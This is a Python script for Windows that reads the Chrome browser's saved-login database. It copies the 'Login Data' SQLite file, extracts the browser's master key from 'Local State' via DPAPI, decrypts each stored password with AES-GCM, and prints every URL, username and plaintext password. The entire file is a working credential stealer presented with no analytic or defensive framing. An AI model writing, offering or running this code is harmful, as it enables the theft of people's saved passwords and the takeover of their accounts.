import os
import json
import shutil
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
username = os.environ.get('USERNAME')
login_data = fr"C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
temp_database = 'temp_login_data.db'
shutil.copy2(login_data, temp_database)
conn = sqlite3.connect(temp_database)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
def decrypt_password(encrypted_password, browser='chrome'):
    local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key)[1]
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted_password.decode("utf-8")
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return None
for row in cursor.fetchall():
    origin_url, username_value, password_value = row
    if password_value:
        decrypted_password = decrypt_password(password_value)
        if decrypted_password:
            print(f"URL: {origin_url}")
            print(f"Username: {username_value}")
            print(f"Password: {decrypted_password}")
        else:
            print(f"URL: {origin_url}")
            print(f"Username: {username_value}")
            print(f"Password: Unable to decrypt: {password_value}")
    else:
        print(f"URL: {origin_url}")
        print(f"Username: {username_value}")
        print(f"Password: [Encrypted]: {password_value}")
conn.close()
os.remove(temp_database)
